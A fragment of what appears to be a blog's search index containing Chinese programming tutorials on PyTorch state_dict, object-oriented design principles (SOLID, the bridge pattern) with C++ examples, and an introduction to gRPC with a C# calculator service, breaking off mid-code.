29 30 31 32 33 34 35 36 37 38 39 40  \u0026gt;\u0026gt; class Net(torch.nn.Module): ...: def __init__(self): ...: super().__init__() ...: self.linear_1 = torch.nn.Linear(3,2) ...: self.linear_2 = torch.nn.Linear(2,1) \u0026gt;\u0026gt; net = Net() \u0026gt;\u0026gt; net.modules \u0026gt;\u0026gt; \u0026lt;bound method Module.modules of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.named_modules \u0026gt;\u0026gt; \u0026lt;bound method Module.named_modules of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.state_dict() \u0026gt;\u0026gt; OrderedDict([(\u0026#39;linear_1.weight\u0026#39;, tensor([[-0.5300, -0.5476, 0.0943], [-0.2907, 0.1068, 0.5465]])), (\u0026#39;linear_1.bias\u0026#39;, tensor([ 0.3375, -0.4314])), (\u0026#39;linear_2.weight\u0026#39;, tensor([[ 0.0114, -0.2185]])), (\u0026#39;linear_2.bias\u0026#39;, tensor([0.1354]))]) \u0026gt;\u0026gt; net.parameters \u0026gt;\u0026gt; \u0026lt;bound method Module.parameters of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.lambda1 = torch.nn.Parameter(torch.randn((1,1))) \u0026gt;\u0026gt; net.lambda1 \u0026gt;\u0026gt; Parameter containing: tensor([[-0.0876]], requires_grad=True) \u0026gt;\u0026gt; net.state_dict() \u0026gt;\u0026gt; OrderedDict([(\u0026#39;lambda1\u0026#39;, tensor([[-0.0876]])), (\u0026#39;linear_1.weight\u0026#39;, tensor([[-0.5300, -0.5476, 0.0943], [-0.2907, 0.1068, 0.5465]])), (\u0026#39;linear_1.bias\u0026#39;, tensor([ 0.3375, -0.4314])), (\u0026#39;linear_2.weight\u0026#39;, tensor([[ 0.0114, -0.2185]])), (\u0026#39;linear_2.bias\u0026#39;, tensor([0.1354]))])   optimizer 1 2 3 4 5 6 7 8 9 10 11  \u0026gt;\u0026gt; optimizer = torch.optim.Adam(net.parameters(), lr=0.01) \u0026gt;\u0026gt; optimizer.state_dict() \u0026gt;\u0026gt; {\u0026#39;state\u0026#39;: {}, \u0026#39;param_groups\u0026#39;: [{\u0026#39;lr\u0026#39;: 0.01, \u0026#39;betas\u0026#39;: (0.9, 0.999), \u0026#39;eps\u0026#39;: 1e-08, \u0026#39;weight_decay\u0026#39;: 0, \u0026#39;amsgrad\u0026#39;: False, \u0026#39;params\u0026#39;: [0, 1, 2, 3, 4]}]} \u0026gt;\u0026gt; optimizer.state \u0026gt;\u0026gt; defaultdict(dict, {})   ","date":"2022-06-20T20:07:09+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/pytorch/","title":"Protobuf"},{"content":"面向对象程序设计基础 目录 [TOC]\n在大一的程设课上，我们系统学习了C++的语法，掌握了一些编写小型程序的技能。实际上，要想写出一个可读性好、可复用、鲁棒性强的程序，掌握一些基本的设计原则是十分必要的。\n本讲的内容并不针对具体的某一语言，而且相比之前的一些内容，本讲的知识更需要在长期的实践中“内化”；与此同时，与软件工程相关的理论博大精深，本讲仅仅挑选一些代表性的原则，只能带领大家入门，想要了解更多还需要仔细阅读文末提供的书单~\nKISS KISS代表着“Keep It Simple and Stupid”。KISS原则指出，简单性应该是软件开发的主要目标，应该避免不必要的复杂性。\n不过，如何界定“简单”？KISS原则指出，为了保证代码的灵活性和可扩展性，我们可能不得不增加代码的复杂度。但除此之外，在这种问题固有复杂性的基础之上增加自制的复杂性，是十分不明智的做法——程序并非程序员炫技的场所，而应该是一件简约的艺术品。\n一言以概之：如无必要，勿增实体。\nLoose Coupling⭐ Loose Coupling，即松耦合原则。这一原则指出：模块与模块之间的耦合（即相互关联的程度）应该越小越好，或者说，它们应该尽可能少地感知到对方的存在。\n举一个例子吧（本例选自 Clean C++ 一书）：\n考虑你有一台电灯，和一个用于控制电灯的开关：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  class Lamp { public: void on() { } void off() { } } class Switch { public: Switch(Lamp\u0026amp; lamp): lamp(lamp) {} void toggle() { if (state) { state = false; lamp.off(); } else { state = true; lamp.on(); } } }   在这样的设计方法下，开关可以工作，但可能会带来一个问题：Switch类中包含了Lamp类的引用，Switch类与Lamp类之间存在着强耦合关系——Switch类可以感知到Lamp类的存在。\n这种写法不仅不符合常理，而且不便于维护和扩展：试想，如果我们想要用开关控制电扇、充电器等其它电器该怎么办？难道我们需要分别设计SwitchForLamp、SwitchForFan、SwitchForCharger类吗？\n如何解决这类耦合问题？一个方法是：将两个类之间相关联的部分抽象成一个接口（interface），第二个类此时不需要包含第一个类的实例或引用，而只需要对接口负责，从而降低耦合度，提高程序的可扩展性。\n以上程序可以改写如下（在C++中，接口可以使用虚基类实现）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  #include \u0026lt;iostream\u0026gt; class Switchable { public: virtual void on() = 0; virtual void off() = 0; }; class Switch { public: Switch(Switchable\u0026amp; switchable) : Switchable(switchable) {} void toggle() { if (state) { state = false; switchable.off(); } else { state = true; switchable.on(); } } private: Switchable\u0026amp; switchable; bool state {false}; }; class Lamp: public Switchable { public: void on() override { std::cout \u0026lt;\u0026lt; \u0026#34;Lamp is on!\u0026#34; \u0026lt;\u0026lt; std::endl; } void off() override { std::cout \u0026lt;\u0026lt; \u0026#34;Lamp is off!\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class Fan: public Switchable { public: void on() override { std::cout \u0026lt;\u0026lt; \u0026#34;Fan is on!\u0026#34; \u0026lt;\u0026lt; std::endl; } void off() override { std::cout \u0026lt;\u0026lt; \u0026#34;Fan is off!\u0026#34; \u0026lt;\u0026lt; std::endl; } }; int main() { Lamp lamp; Switch switch1(lamp); switch1.toggle(); switch1.toggle(); Fan fan; Switch switch2(fan); switch2.toggle(); switch2.toggle(); }   在以上更改中，开关与其它电器耦合的部分被抽象为一个接口Switchable，开关只需要对这一接口进行操作，避免了开关与具体电器类的耦合。\nSOLID⭐ SOLID是以下五大面向对象设计原则的缩写：\n 单一功能原则（Single Responsibility Principle，SRP） 开闭原则（Open Closed Principle，OCP） 里氏替换原则（Liskov Substitution Principle，LSP） 接口隔离原则（Interface Segregation Principle，ISP） 依赖反转原则（Dependency Inversion Principle，DIP）。  单一功能原则 单一功能原则指出，每个软件单元（类、函数等），应该只有一个单一的、定义明确的责任。\n如何界定单一责任？一个比较普适的定义是，改变该软件单元只能有一个原因。如果有多个原因，那么该单元就应该拆分。\n开闭原则 开闭原则指出，软件单元（类、函数等）应该对于扩展是开放的，但是对于修改是封闭的。\n具体来讲，如果我们需要给一个软件添加新的功能，我们通常不建议修改源码，而更加建议通过继承的方式。\n里氏替换原则⭐ 里氏原则指出，派生类（子类）对象可以在程序中代替其基类（超类）对象。\n换句话说，一个软件实体如果使用的是一个父类，那么也一定适用于其子类——把一个软件里面的父类都替换为它的子类，程序的行为是不会发生变化的。\n利用这一原则，我们可以判断类与类之间的继承关系是否合适。\n举个例子，假设我们拥有一个矩形类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  class Rectangle { public: Rectangle(int width, int height) : width(width), height(height) {} void setWidth(int width) { this-\u0026gt;width = width; } void setHeight(int height) { this-\u0026gt;height = height; } void setEdges(int width, int height) { this-\u0026gt;width = width; this-\u0026gt;height = height; } private: int width; int height; };   我们想要再新建立一个正方形类。根据初中几何知识：正方形是一种特殊的矩形——因此一种直观的想法是：让正方形类去继承矩形类：\n1 2 3 4  class Square: public Rectangle { // ... };   但如果站在里氏替换原则的角度来看，这一设计是不科学的！比如我们考虑以下操作：\n1 2 3  Rectangle rectangle; rectangle.setHeight(20); rectangle.setEdges(10, 5);   根据里氏替换原则，派生类对象（Square）一定可以替换基类对象（Rectangle），假如我们进行这一替换：\n1 2 3  Square square; square.setHeight(20); square.setEdges(10, 5);   这时就出现了问题：\n 第一个操作会产生歧义：该操作是只改变正方形的宽（这样会违背正方形的定义），还是同时改变正方形的长和宽（这样违背函数的字面意思）。 第二个操作则会直接违背正方形的定义。  可以看到，派生类对象在此处替换基类对象会产生很多问题，这一继承是不科学的！\n接口隔离原则⭐ 接口隔离原则指出，程序员在设计接口时应当将臃肿庞大的接口拆分成更小的和更具体的接口，让接口中只包含客户感兴趣的方法——使用多个专门的接口比使用单一的总接口要好。\n换句话讲，接口约束了类的行为，是一种减轻代码耦合程度的好方法。但如果一个接口太过宽泛，可能会带来一些不必要的麻烦。举例说明：\n我们想要定义一个“鸟”接口：\n1 2 3 4 5 6 7  class Bird { public: virtual void eat() = 0; virtual void breathe() = 0; virtual void fly() = 0; };   在此基础上实现一个鸽子类，现在一切看上去都正常：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Pigeon: public Bird { public: virtual void eat() override { // ...  } virtual void breathe() override { // ...  } virtual void fly() override { // ...  } };   我们再实现一个企鹅类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Penguin: public Bird { public: virtual void eat() override { // ...  } virtual void breathe() override { // ...  } virtual void fly() override { // ???  } };   问题发生了。我们在一开始设计“鸟”这一接口时，想当然地以为所有地鸟类都会飞，却忽略了企鹅不会飞这一特例。\n为了避免这样的情况发生，我们需要小心地将接口拆分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  class Lifeform { public: virtual void eat() = 0; virtual void breathe() = 0; }; class Flyable { public: virtual void fly() = 0; }; class Pigeon: public Lifeform, public Flyable { public: void eat() override { // ...  } void breathe() override { // ...  } void fly() override { // ...  } }; class Penguin: public Lifeform { public: void eat() override { // ...  } void breathe() override { // ...  } };   如上文所示，所有的鸟类都需要呼吸和进食，我们可以大胆地将其封装为Lifeform接口，而并非所有鸟类都会飞，所以需要将其单独提取出来作为Flyable接口。在实现不同的鸟类时，我们将这些接口进行筛选组合即可。\n依赖倒转原则⭐ 依赖倒转原则指出，在实际的开发场景中，类与类之间的依赖关系是十分复杂，在设计依赖关系时，高层模块不应该依赖低层模块，二者都应该依赖其抽象。\n什么意思呢？考虑以下实例，一个用户在某在线网络平台上拥有一个账户，而这个账户又存储着该用户的信息。由此，两者不可避免地产生了下列的循环依赖关系——你中有我，我中有你：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  class Account; class Customer { public: // ...  void setAccount(Account *account) { customerAccount = account; } // ... private: Account *customerAccount; }; class Account { public: void setOwner(Customer *customer) { owner = customer; } private: Customer *owner; }; int main() { Account* account = new Account { }; Customer* customer = new Customer { }; account-\u0026gt;setOwner(customer); customer-\u0026gt;setAccount(account); }   这会导致很严重的问题：首先代码的可读性由于循环依赖下降，而且两者的生命周期不相互独立——如果Account对象的生命周期先于Customer对象结束，Customer对象中将会产生一个空指针，调用Customer对象中的成员函数可能会导致程序崩溃。\n而依赖倒转原则为解决此类问题提供了一套流程：\n 不允许两个类中的其中一个直接访问另一个类，要想进行这种访问操作，需要通过接口。 实现这个接口。  在本例中，我们不再使得Account类中包含有Customer类的指针，所有Account类需要访问Customer类的行为，都被定义进一个叫做Owner的接口中，而后，Customer类需要实现这个接口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt; class Owner { public: virtual std::string getName() = 0; }; class Account; class Customer : public Owner { public: void setAccount(Account* account) { customerAccount = account; } virtual std::string getName() override { // return the Customer\u0026#39;s name here...  } // ... private: Account* customerAccount; // ... }; class Account { public: void setOwner(Owner* owner) { this-\u0026gt;owner = owner; } //... private: Owner* owner; };   经过修改之后，Account类将不依赖于Customer类。\n设计模式⭐ C++、C#、Python等语言为实现继承、多态等面向对象特性提供了丰富的语法。那么在具体的软件工程中，又该如何使用这些特性呢？这就是设计模式。设计模式是上述SOLID原则在软件工程中的具体体现。\n设计模式共计分为3大类22小类：\n  创建型模式提供创建对象的机制， 增加已有代码的灵活性和可复用性。\n  结构型模式介绍如何将对象和类组装成较大的结构， 并同时保持结构的灵活和高效。\n  行为模式负责对象间的高效沟通和职责委派。\n  不同的设计模式之间有着相似的理念和重叠之处。合理利用设计模式可以让代码更加规范、更容易维护，但盲目使用设计模式也不是明智之举。\n本讲将介绍一个难度较大，而且应用较为广泛的设计模式——桥接模式（属于结构型模式）。\n桥接模式的定义如下：桥接模式是将类抽象部分与实现部分分离，使它们都可以独立地变化。\n什么是抽象部分？什么是实现部分？让我们先考虑以下场景：一家奶茶店售卖不同种类的奶茶，奶茶既有不同的容量，也有不同的口味。如果我们只需要改变奶茶的容量，可以做出如下设计：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  class IMilkTea // 通用接口 { virtual void order() = 0; }; class MilkTeaSmallCup: public IMilkTea { void order() override { std::cout \u0026lt;\u0026lt; \u0026#34;order info:\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;size: small cup\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class MilkTeaMediumCup: public IMilkTea { void order() override { std::cout \u0026lt;\u0026lt; \u0026#34;order info:\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;size: medium cup\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class MilkTeaLargeCup: public IMilkTea { void order() override { std::cout \u0026lt;\u0026lt; \u0026#34;order info:\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;size: large cup\u0026#34; \u0026lt;\u0026lt; std::endl; } };   当类的变化只有一个维度时，继承的思路是比较直接而简单的。但当我们将“口味”也加入继承体系中，也就是当类的变化有两个维度时，沿用上面的思路将会使得类的数量急剧增长：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class MilkTeaSmallCupFairyGrass: public IMilkTea { void order() override { std::cout \u0026lt;\u0026lt; \u0026#34;order info:\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;size: small cup\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;flavor: fairy grass\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class MilkTeaSmallCupPearl: public IMilkTea { void order() override { std::cout \u0026lt;\u0026lt; \u0026#34;order info:\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;size: small cup\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;flavor: pearl\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // class MilkTeaMediumCupPearl, class MilkTeaLargeCupFairyGrass, ...   问题的根源在于，我们试图在两个独立的维度（“容量”和“口味”）上扩展奶茶类。这时候，桥接模式就派上了用场：我们将容量视为抽象部分，将口味视为实现部分，并将两者桥接。\n “抽象部分”和“实现部分”所承担的角色：\n 抽象部分：抽象化给出的定义，只提供高层控制逻辑，依赖于完成底层实际工作的实现对象。抽象部分保存一个对实现化对象的引用（指针）。 实现部分：给出实现化角色的通用接口，抽象部分仅能通过在这里声明的方法与实现对象交互。   例如在本例中，可以做如下修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  // 实现化部分 class IMilkTeaFlavorBase { public: virtual void GetFlavor() = 0; }; class MilkTeaPearl: public IMilkTeaFlavorBase { public: void GetFlavor() override { std::cout \u0026lt;\u0026lt; \u0026#34;flavor: pearl\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class MilkTeaFairyGrass: public IMilkTeaFlavorBase { public: void GetFlavor() override { std::cout \u0026lt;\u0026lt; \u0026#34;flavor: fairy grass\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // 抽象化部分 class IMilkTeaSizeBase { public: virtual void SetFlavor(std::shared_ptr\u0026lt;IMilkTeaFlavorBase\u0026gt; flavorBase) { this-\u0026gt;flavorBase = flavorBase; } virtual void Order() = 0; protected: std::shared_ptr\u0026lt;IMilkTeaFlavorBase\u0026gt; flavorBase; }; class MilkTeaSmall: public IMilkTeaSizeBase { public: void Order() override { std::cout \u0026lt;\u0026lt; \u0026#34;size: small\u0026#34; \u0026lt;\u0026lt; std::endl; flavorBase-\u0026gt;GetFlavor(); } }; class MilkTeaMedium: public IMilkTeaSizeBase { public: void Order() override { std::cout \u0026lt;\u0026lt; \u0026#34;size: medium\u0026#34; \u0026lt;\u0026lt; std::endl; flavorBase-\u0026gt;GetFlavor(); } }; class MilkTeaLarge: public IMilkTeaSizeBase { public: void Order() override { std::cout \u0026lt;\u0026lt; \u0026#34;size: large\u0026#34; \u0026lt;\u0026lt; std::endl; flavorBase-\u0026gt;GetFlavor(); } }; // 使用方法 int main() { // 大杯烧仙草  std::shared_ptr\u0026lt;MilkTeaFairyGrass\u0026gt; milkTeaFairyGrass = std::make_shared\u0026lt;MilkTeaFairyGrass\u0026gt;(); std::shared_ptr\u0026lt;MilkTeaLarge\u0026gt; milkTeaLargeWithFairyGrass = std::make_shared\u0026lt;MilkTeaLarge\u0026gt;(); milkTeaLargeWithFairyGrass-\u0026gt;SetFlavor(milkTeaFairyGrass); milkTeaLargeWithFairyGrass-\u0026gt;Order(); }   可以在上述示例中看到：抽象部分各类中，都含有一个实现部分的指针。如果需要访问实现部分的方法，可以通过该指针进行访问。这样，我们就通过桥接的方式分离了两个不同的维度，使得类的可扩展性更好。\n由于篇幅所限，我们在此处不能对设计模式进行一一介绍，感兴趣的同学可以参考文末给出的阅读清单进行学习。\n参考文献和荐读清单 Refactoring.Guru 该网站详细介绍了各设计模式的特点，并提供了不同编程语言的实例。\nClean C++ 这本书的侧重点不在介绍C++语法，而侧重于使用C++语言介绍如何写出可读性强、符合面向对象规范的程序，强推！\n","date":"2022-06-20T20:07:09+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/oop/","title":"面向对象程序设计基础"},{"content":" 清华大学计算机系操作系统课件 uCore rCore 南京大学操作系统  ","date":"2022-06-20T20:07:09+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/os_resoures/","title":"面向对象程序设计基础"},{"content":"gRPC 无03 王与进\n目录 [TOC]\n前言 在介绍gRPC之前，我们需要先介绍几个在通信中需要用到的概念。\nClient-Server model:star: Client-Server结构是一种经典的通信模型。它通常采取两层结构：\n 服务器（Server）负责数据的处理。它有以下特征：  等待来自客户端的请求 处理请求并传回结果   客户端（Client）负责完成与用户的交互任务。它有以下特征：  发送请求 等待直到收到响应    THUAI5就是一个应用了Client-Server model的典型实例：\n在游戏中，玩家通过在Client端编写C++代码来制定游戏策略，而Server端由Csharp语言写成，用于分析处理游戏逻辑。编译生成的Client端可执行文件将向Server端发送请求，请求处理完毕后Server端再向Client端发送处理后的结果，这样Client端就可以接受到游戏实况，以供下一步决策。\nIP Address IP Address(Internet Protocol address，网际协议地址)，是网际协议中用于标识发送或接受数据报的设备的一串数字。\n当设备连接网络后，设备将被分配一个IP地址，对于一个具体的设备而言，IP地址是独一无二的。IP地址有两个主要的功能：标识主机（用户在互联网上可以识别）和网络寻址（允许计算机通过互联网发送和接受数据）。\n常见的IP地址分为IPv4和IPv6两大类：\n  IPv4：32位长，通常书写时以四组十进制数字组成，并以点分割，例如：172.16.254.1。\n  IPv6：128位长，通常书写时以八组十六进制数字组成，并以冒号分割，例如：\n2001:db8:0:1234:0:567:8:1。\n  我们可以使用如下方法查询本机的IP地址：\n windows：ipconfig linux：ifconfig（可能需要使用sudo apt-get install net-tools进行安装）   一个特殊的IP地址：127.0.0.1\n尽管现在有大量可用的 IP 地址，但为了防止编程冲突的特定目的，刻意保留一些地址，甚至是地址范围是很方便的。\n127.0.0.1就是其中一个。它表示的是主机环回地址，表示的是任何数据包都不应该离开计算机，计算机本身即为接收者。\n当我们需要在本地测试一些网站服务，或者只想在本地设备上运行只有本地设备可以访问的服务，就可以使用127.0.0.1。\n Port Port(端口)在电脑网络中是一种经过软件创建的服务，在一个电脑的操作系统中扮演通信的端点。\n什么意思呢？利用IP地址，可以实现不同计算机之间的通信。但实际上，计算机中是运行着多个进程的——当不同的信息被传入计算机后，计算机需要一种手段来区分信息的接收者，以将不同进程的处理结果正确地发送给接收者。\n这个时候，端口就派上了用场。如果我们在通信时不仅指定IP地址，而且指定端口，计算机就可以正确地将不同的请求交给正确的进程处理。\n特定的服务一般对应于特定的端口，详见端口列表。\n我们可以使用如下方法查看本机的端口使用情况：\n windows：netstat -ano| findstr \u0026quot;\u0026lt;port\u0026gt;\u0026quot; linux：netstat -tunlp | grep \u0026lt;port\u0026gt;或lsof -i:\u0026lt;port\u0026gt;  gRPC概况 gRPC的全称是gRPC Remote Procedure Calls。其中“Remote Procedure Calls”翻译为“远程过程调用”。“远程过程调用”指的是客户端（Client）可以像调用本地对象一样直接调用服务端（Server）应用的方法。具体过程如下：\n 定义若干服务（Service），指定其能够被远程调用的方法（包含参数和返回类型）。这些定义都写在.proto文件里。 在服务端（Server）实现这个接口（内部处理逻辑），并运行gRPC服务器，来处理客户端的调用。 在客户端（Client）建立一个存根（stub），提供与服务端相同的方法。  下面的图形象地展示了gRPC的使用过程：\n这样一来，用户在使用gRPC构建的应用程序时，不需要关心调用方法的内部逻辑（被封装在Server中），只需要调用Client端提供的方法向Server端提供请求，等待Server端返回结果即可——看上去就和在Client端本地调用方法一样。\ngRPC有诸多优点：\n 速度快：gRPC使用protobuf进行Server/Client之间数据的序列化和反序列化，保证了通信的高效。 跨语言：构建Server端和Client端程序的源语言无需一致。 跨平台：Server端和Client端的平台无需一致。  我们仍然THUAI5为例，阐述gRPC在构建具体项目中的意义（注：虽然THUIA5中使用的通信方法并非gRPC，但gRPC对我们的设计仍然有着重大的借鉴意义）：\n Server端需要实现复杂的游戏逻辑，而且需要支持Unity，如果使用C++语言可能会导致开发效率太低，因此需要使用Csharp语言进行开发。 Client端需要提供选手接口供选手编写AI代码，因此需要使用C++语言开发。  两者使用语言不同，如何使得两者建立联系？我们可以使用gRPC的思路：\n 在.proto文件中定义选手可以调用的游戏方法（如人物操作和获取物品信息）。 在Server端实现这些接口的内部逻辑。 在Client端提供用户需要直接调用的方法，而无需关心其具体实现。  于是我们就实现了Server和Client的解耦。在此基础上，我们甚至可以提供不同种类语言的用户接口——你可以使用Python、Java或其它语言来编写你的游戏策略。\ngRPC安装 C++ 安装gRPC C++相关的库需要手动编译其源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13  $ git clone -b v1.46.3 --depth 1 --shallow-submodules https://github.com/grpc/grpc # 如果网络不佳，可以将网址换为 https://gitee.com/mirrors/grpc.git $ cd grpc $ git submodule update --init --recursive # 在grpc的原文档中没有submodule该步，但笔者实测，如果没有这一步grpc将无法安装。 $ mkdir -p cmake/build $ pushd cmake/build $ cmake -DgRPC_INSTALL=ON \\  -DgRPC_BUILD_TESTS=OFF \\  ../.. $ make -j $ make install # 或 sudo make install $ popd    需要指出的是，由于网络等问题，git submodule update --init --recursive一步往往无法正常运行。为此可以点击此处下载third_party.tar.gz，并将git submodule..一步替换为以下操作：\n1 2 3 4  $ rm -rf third_party $ mv \u0026lt;tar_gz_path\u0026gt; . $ tar -zxvf third_party.tar.gz $ cd ..    Csharp Csharp中，我们可以使用NuGet程序包安装gRPC库（图中第一项）。\ngRPC服务:star: grpc默认使用protobuf作为接口定义语言。定义方式见下例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // The greeter service definition. service Greeter { // Sends a greeting  rpc SayHello (HelloRequest) returns (HelloReply);}// The request message containing the user\u0026#39;s name. message HelloRequest { string name = 1;}// The response message containing the greetings message HelloReply { string reply = 1;}  定义服务使用了service和rpc关键字。粗略地来讲，在本例中，gRPC服务接受一条含有name字段的HelloRequest message，发送给服务端处理后，返回一条含有reply字段的HelloRequest message。\ngRPC可以定义以下4种服务：\n 单一RPC（Unary RPCs），客户端向服务器发送一个请求，并得到一个响应，就像一个正常的函数调用。简单来讲就是一个请求对象对应一个返回对象。  1  rpc SayHello(HelloRequest) returns (HelloResponse);   服务器流式RPC（Server streaming RPCs），客户端向服务器发送请求，并获得一个流来读回一连串的消息。客户端从返回的流中读取信息，直到没有更多的信息。gRPC保证在单个RPC调用中的信息排序。简单来讲就是发送一个请求对象，服务端可以传回多个结果对象。  1  rpc LotsOfReplies(HelloRequest) returns (stream HelloResponse);   客户端流式RPC（Client streaming RPCs），客户端写了一串消息并将它们发送给服务器，同样使用一个提供的流。一旦客户端完成了消息的写入，它就等待服务器读取它们并返回其响应。gRPC再次保证了单个RPC调用中的消息排序。简单来讲就是客户端传入多个请求对象，服务端返回一个响应结果。  1  rpc LotsOfGreetings(stream HelloRequest) returns (HelloResponse);   双向流RPC（Bidirectional streaming RPCs），双方使用读写流发送一连串的消息。这两个流独立运行，因此客户和服务器可以按照他们喜欢的顺序进行读写：例如，服务器可以等待收到所有客户的消息，然后再写它的响应，或者它可以交替地读一个消息，然后再写一个消息，或者其他一些读和写的组合。每个流中的消息的顺序被保留下来。简单来讲就是结合客户端流式rpc和服务端流式rpc，可以传入多个对象，返回多个响应对象。  1  rpc BidiHello(stream HelloRequest) returns (stream HelloResponse);  接下来我们将结合一些实例进一步了解它们的使用方法和区别。\ngRPC使用:star: 在本例中，我们将使用Csharp语言实现一个简单的Client-Server模型——Client端提供两个数和一个操作符，而Server端则进行具体的运算过程并将计算结果返回给Client端。\nproto 我们不妨考虑以下服务场景：\n 客户端发送一个包含两个操作数和一个运算符的元组，服务端返回一个结果：该场景符合单一RPC。 客户端发送一个包含两个操作数和一个运算符的元组，服务端返回计算结果，并将该结果重复多次：该场景符合服务器流式RPC。 客户端发送若干个包含两个操作数和一个运算符的元组，服务端返回计算结果之和：该场景符合客户端流式RPC。 客户端发送若干个包含两个操作数和一个运算符的元组，服务端分别返回每一对元组的计算结果之和：该场景符合双向流RPC。  我们需要在Message.proto文件中定义需要提供的服务：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  syntax = \u0026#34;proto3\u0026#34;;package hello;enum Operator { NONE_OP = 0; ADD = 1; SUB = 2; MUL = 3;}message Operand { int32 op1 = 1; int32 op2 = 2; Operator opr = 3;}message Result { int32 val = 1;}service Calculator { // Unary  rpc UnaryCall (Operand) returns (Result); // Server streaming  rpc StreamingFromServer (Operand) returns (stream Result); // Client streaming  rpc StreamingFromClient (stream Operand) returns (Result); // Bi-directional streaming  rpc StreamingBothWays (stream Operand) returns (stream Result);}  之后就可以使用该文件生成对应的CSharp文件以供使用。\nServer Server端有两个任务：\n 实现我们服务定义的生成的服务接口：做我们的服务的实际的“工作”。 运行一个 gRPC 服务器，监听来自客户端的请求并返回服务的响应。  为了实现这些目的，我们需要在Server端定义一个CalculatorImpl类，并继承Calculator.CalculatorBase类，以实现所有的服务方法。\n 对于Calculator.CalculatorBase类的解释：Base class for server-side implementations of Calculator。可见它是专供Server端使用的一个基类。\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93  class CalculatorImpl : Calculator.CalculatorBase { public override Task\u0026lt;Result\u0026gt; UnaryCall(Operand operand, ServerCallContext context) { var res = new Result(); switch (operand.Opr) { case Operator.Add: res.Val = operand.Op1 + operand.Op2; break; case Operator.Sub: res.Val = operand.Op1 - operand.Op2; break; case Operator.Mul: res.Val = operand.Op1 * operand.Op2; break; default: break; } return Task.FromResult(res); } public override async Task StreamingFromServer(Operand operand, IServerStreamWriter\u0026lt;Result\u0026gt; result_stream, ServerCallContext context) { var res = new Result(); switch (operand.Opr) { case Operator.Add: res.Val = operand.Op1 + operand.Op2; break; case Operator.Sub: res.Val = operand.Op1 - operand.Op2; break; case Operator.Mul: res.Val = operand.Op1 * operand.Op2; break; default: break; } for (var i = 0; i \u0026lt; 3; i++) { await result_stream.WriteAsync(res); } } public override async Task\u0026lt;Result\u0026gt; StreamingFromClient(IAsyncStreamReader\u0026lt;Operand\u0026gt; operand_stream, ServerCallContext context) { var res = new Result(); while (await operand_stream.MoveNext()) { var operand = operand_stream.Current; switch (operand.Opr) { case Operator.Add: res.Val += operand.Op1 + operand.Op2; break; case Operator.Sub: res.Val += operand.Op1 - operand.Op2; break; case Operator.Mul: res.Val += operand.Op1 * operand.Op2; break; default: break; } } return res; } public override async Task StreamingBothWays(IAsyncStreamReader\u0026lt;Operand\u0026gt; operand_stream, 